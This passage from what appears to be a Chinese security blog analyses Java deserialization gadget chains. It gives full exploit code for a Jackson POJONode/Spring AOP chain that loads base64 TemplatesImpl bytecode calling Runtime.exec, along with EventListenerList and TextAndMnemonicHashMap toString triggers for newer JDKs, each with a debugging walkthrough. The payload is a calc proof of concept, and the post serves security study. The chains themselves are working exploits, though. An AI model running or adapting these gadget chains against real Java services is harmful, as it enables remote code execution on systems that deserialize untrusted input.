+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">fasterxml</span>.<span class="property">jackson</span>.<span class="property">databind</span>.<span class="property">node</span>.<span class="property">POJONode</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TemplatesImpl</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TransformerFactoryImpl</span>;</span><br><span class="line"><span class="keyword">import</span> javassist.<span class="property">ClassPool</span>;</span><br><span class="line"><span class="keyword">import</span> javassist.<span class="property">CtClass</span>;</span><br><span class="line"><span class="keyword">import</span> javassist.<span class="property">CtMethod</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.<span class="property">springframework</span>.<span class="property">aop</span>.<span class="property">framework</span>.<span class="property">AdvisedSupport</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">management</span>.<span class="property">BadAttributeValueExpException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">xml</span>.<span class="property">transform</span>.<span class="property">Templates</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Field</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">InvocationHandler</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Proxy</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Jackson</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">Object</span> <span class="title function_">rtobject</span>() throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="comment">// step 1</span></span><br><span class="line">        <span class="title class_">CtClass</span> ctClass = <span class="title class_">ClassPool</span>.<span class="title function_">getDefault</span>().<span class="title function_">get</span>(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="title class_">CtMethod</span> writeReplace = ctClass.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.<span class="title function_">removeMethod</span>(writeReplace);</span><br><span class="line">        ctClass.<span class="title function_">toClass</span>();</span><br><span class="line">        <span class="comment">// step 2</span></span><br><span class="line">        <span class="title class_">POJONode</span> node = <span class="keyword">new</span> <span class="title class_">POJONode</span>(<span class="title function_">makeTemplatesImplAopProxy</span>());</span><br><span class="line">        node.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="comment">// step 3</span></span><br><span class="line">        <span class="title class_">BadAttributeValueExpException</span> val = <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">Object</span> <span class="title function_">rtEvilObj</span>() throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">String</span> base64Code =<span class="string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>;</span><br><span class="line">        byte[] code = <span class="title class_">Base64</span>.<span class="title function_">getDecoder</span>().<span class="title function_">decode</span>(base64Code);</span><br><span class="line">        <span class="title class_">TemplatesImpl</span> obj = <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="title function_">setFieldValue</span>(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> byte[][]&#123;code&#125;);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">Object</span> <span class="title function_">makeTemplatesImplAopProxy</span>() throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">AdvisedSupport</span> advisedSupport = <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.<span class="title function_">setTarget</span>(<span class="title function_">rtEvilObj</span>());</span><br><span class="line">        <span class="title class_">Constructor</span> constructor = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).<span class="title function_">getConstructor</span>(<span class="title class_">AdvisedSupport</span>.<span class="property">class</span>);</span><br><span class="line">        constructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">InvocationHandler</span> handler = (<span class="title class_">InvocationHandler</span>) constructor.<span class="title function_">newInstance</span>(advisedSupport);</span><br><span class="line">        <span class="title class_">Object</span> proxy = <span class="title class_">Proxy</span>.<span class="title function_">newProxyInstance</span>(<span class="title class_">ClassLoader</span>.<span class="title function_">getSystemClassLoader</span>(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="title class_">Templates</span>.<span class="property">class</span>&#125;, handler);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span>(<span class="title class_">Object</span> obj, <span class="title class_">String</span> fieldName, <span class="title class_">Object</span> value) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">Field</span> field = obj.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(fieldName);</span><br><span class="line">        field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        field.<span class="title function_">set</span>(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title function_">rtobject</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>先进BadAttributeValueExpException的readObject，在这里触发toString</p>
+<p><img src="/images/3015d30f7234c008613444f48cfd0e25.png"></p>
+<p>这里调的时候同样要注意关闭valObj的呈现器，不然idea的toString直接弹计算机了</p>
+<p><img src="/images/a78b92a8644a802b268e6f3bb67d9705.png"></p>
+<p>跟进toString，来到BaseJsonNode</p>
+<p><img src="/images/22d5722a9ffc0af5b884f57c2a05e250.png"></p>
+<p>InternalNodeMapper</p>
+<p><img src="/images/c3911891d4f42631344c2b4ff784f6d6.png"></p>
+<p>ObjectWriter</p>
+<p><img src="/images/4f2b20e425e73bb34ea46df78f67da84.png"></p>
+<p>如果设置了Closeable，会自动关闭Closeable资源，_writeCloseable其实只是对serialize进行了封装，但是这对我们今天的分析无益，但是看到又这个又不好直接跳过。接下来我们直接进入serialize</p>
+<p><img src="/images/bb9307ed8ff92de1ade66c9a7f1418eb.png"></p>
+<p>这里面的代码还是比较清晰的，我们没有像这样指定rootType， Jackson会进入最后一个else自动推导，而 typeSerializer用来解析类型，valueSerializer用来解析值倒是很好理解</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectWriter</span> <span class="variable">writer</span> <span class="operator">=</span> mapper.writerFor(Number.class); </span><br><span class="line"><span class="comment">// 指定 rootType，向jackson指定要序列化的是什么类型</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/7fe272d09d13b60c0ea08853da3b710a.png"></p>
+<p>然后和fastjson很像，通过类型选择对应serializer</p>
+<p><img src="/images/0b7f412d66161734df52ed551fe671de.png"></p>
+<p>然后用相应ser继续解析</p>
+<p><img src="/images/e53cc314aff0aabf673bc9ab72df526a.png"></p>
+<p>这个ser知道POJONode中有定义serialize，转而使用value的serializer</p>
+<p><img src="/images/ef11eb781f77ec3e30b8282e07db5bf6.png"></p>
+<p>然后开始解析内层的proxy对象，即_value，按照标准serialize方式处理</p>
+<p><img src="/images/fab431b1a4231e30d8f299b958ee1501.png"></p>
+<p>然后当然又要根据它来选择seializer，这里是选上了BeanSerializer，这个方法里面已经把我们对象的方法信息储存在了_props中</p>
+<p><img src="/images/bc26fedc1b53d74e79e7f3606e59e928.png"></p>
+<p>然后我们的proxy对象直接改名成bean了，后面肯定得调getter了，继续跟进</p>
+<p><img src="/images/4e7c60072b6fe3c8fa3f5d15e411a561.png"></p>
+<p>对象方法信息从_props到props，再遍历props取出每个可用的getter方法调用包装，然后调用serializeAsField处理</p>
+<p><img src="/images/8323b9e04453156a08f01de934bbf393.png"></p>
+<p>然后就在这里反射调用了getOutputProperties方法</p>
+<p><img src="/images/6c4da4a7ab7d156b1d12ba60ba466f6b.png"></p>
+<h3 id="高版本java使用EventListenerList触发toString"><a href="#高版本java使用EventListenerList触发toString" class="headerlink" title="高版本java使用EventListenerList触发toString"></a><font style="color:rgb(35, 38, 59);">高版本java使用EventListenerList触发toString</font></h3><p>高版本<code>BadAttributeValueExpException</code>的代码也有变化，无法正常触发toString</p>
+<p><img src="/images/987327f57b3d036763fa7fc4fd027856.png">所以在java17中我们常使用<code>javax.swing.event.EventListenerList</code>来调用toString</p>
+<p>写一个小demo</p>
+<p>ToString.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.CompoundEdit;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToString</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Class&lt;?&gt; clazz, Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtobject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        UnsafeUtil.patchModule(ReflectUtil.class);</span><br><span class="line">        <span class="type">ToStringEvil</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringEvil</span>();</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(CompoundEdit.class ,undoManager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(evil);</span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; Map.class, undoManager &#125;);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(Output.serialize(rtobject()).toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ToStringEvil.java 模拟的rce问题类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ToStringEvil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里通过反射改EventListenerList和UndoManager的值，肯定要设置一下，但是反序列化时是正常的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.desktop/javax.swing.event=ALL-UNNAMED </span><br><span class="line">--add-opens java.desktop/javax.swing.undo=ALL-UNNAMED</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h4><p>忽略呈现器，进入EventListenerList#readObject，l为UndoManager对象，继承UndoableEditListener-&gt;EditListener接口</p>
+<p><img src="/images/d208b5429dc79fcd53681a6203bc8558.png"></p>
+<p>add里面合并字符串触发UndoManager的toString</p>
+<p><img src="/images/f4f3c11fa6e43ab22204eea656dca2d8.png"></p>
+<p>调用父类（CompoundEdit）的toString，而limit和indexOfNextAdd是int型无法利用</p>
+<p><img src="/images/2d979944987bf1e177b113512e21a39a.png"></p>
+<p>edits是Object型，可以利用</p>
+<p><img src="/images/ed846361f35d74966ee674dbbe703cc9.png"></p>
+<p>再调用vector的toString</p>
+<p><img src="/images/2f2e54ebdd7c382715ae95739a5ecbd3.png"></p>
+<p>到父类AbstractCollection的toString，跟进sb.append，传入的e是我们的恶意toString类</p>
+<p><img src="/images/f08d1555195ae3abab2b1b0a780d805d.png"></p>
+<p>到StringBuilder的append方法，调用了String.valueOf</p>
+<p><img src="/images/94cddab5d1492808c5c800f44eedd553.png"></p>
+<p>调用toString</p>
+<p><img src="/images/097a99534b9427994d39a933470d25c4.png"></p>
+<h3 id="高版本java使用TextAndMnemonicHashMap触发toString"><a href="#高版本java使用TextAndMnemonicHashMap触发toString" class="headerlink" title="高版本java使用TextAndMnemonicHashMap触发toString"></a><font style="color:rgb(35, 38, 59);">高版本java使用TextAndMnemonicHashMap触发toString</font></h3><p>TextAndMnemonicHashMap的get方法会调key的toString</p>
+<p><img src="/images/16ea5bddfd99e7014b598d89be23b73b.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JackTextAndMnemonicHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Class clazz, Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtobject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringEvil</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringEvil</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tex</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);</span><br><span class="line">        Constructor con=tex.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">texmap1</span> <span class="operator">=</span>(Map) con.newInstance();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">texmap2</span> <span class="operator">=</span>(Map) con.newInstance();</span><br><span class="line">        texmap1.put(t,<span class="number">993</span>);</span><br><span class="line">        texmap2.put(t,<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(texmap1,<span class="number">777</span>);</span><br><span class="line">        hashtable.put(texmap2,<span class="number">999</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(Hashtable.class,hashtable, <span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line"></span><br><span class="line">        texmap1.put(t,<span class="literal">null</span>);</span><br><span class="line">        texmap2.put(t,<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(Output.serialize(rtobject()).toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="调试过程-2"><a href="#调试过程-2" class="headerlink" title="调试过程"></a>调试过程</h4><p>先进Hashtable的readObject，先校验loadFactor</p>
+<p><img src="/images/652ed2ad81befb0fbb40bdfd2db14611.png"></p>
+<p>然后读出key和value存入table</p>
+<p><img src="/images/3087162cf73293f4fa54284d63a0e9ac.png"></p>
+<p>如下，index相同时就调用key.equls，index</p>
+<p><img src="/images/d70c3dbd8ea3402358724ed6724a4e46.png"></p>
+<p>index的长度是通过计算key的hashCode返回值决定</p>
+<p><img src="/images/9267be44821aeefe260a0a755a868266.png"></p>
+<p>把key和value放进hashmap中计算，取出texmap的key和value计算</p>
+<p><img src="/images/248249b7fd805ff26379c09c5e731fb4.png"></p>
+<p>所以我们texmap最后放进了两个相同的key、value</p>
+<p><img src="/images/3604a525b3772f37d272cbeab1f283aa.png"></p>
+<blockquote>
+<p>但是Hashtable的put也会类似于readHashtable方法的，也会计算index而调用equals（都是放入元素嘛）</p>
+<p><img src="/images/299a10e79d1cb59252a3222ee7de613a.png"></p>
+<p>所以我们先在texmap中放入不同的value再put进Hashtable</p>
+<p><img src="/images/b1492004fc7542c11cd7fa4d280fbee6.png"></p>
+</blockquote>
+<p>在equals中调用TextAndMnemonicHashMap#get</p>
+<p><img src="/images/d07a54c67b2f6f5dd1d452d4a9b370dd.png"></p>
+<p>这里的value如果为null就触发key的toString</p>
+<p><img src="/images/29ab6a0cdbfe85e1887cc0c9d289f13d.png"></p>
+<p>所以我们放入的null</p>
+<p><img src="/images/3604a525b3772f37d272cbeab1f283aa.png"></p>
+<h2 id="Jackson反序列化漏洞"><a href="#Jackson反序列化漏洞" class="headerlink" title="Jackson反序列化漏洞"></a>Jackson反序列化漏洞</h2><p>用的少不想写了，maybe后面有空再写</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18411262">https://www.cnblogs.com/gaorenyusi/p/18411262</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
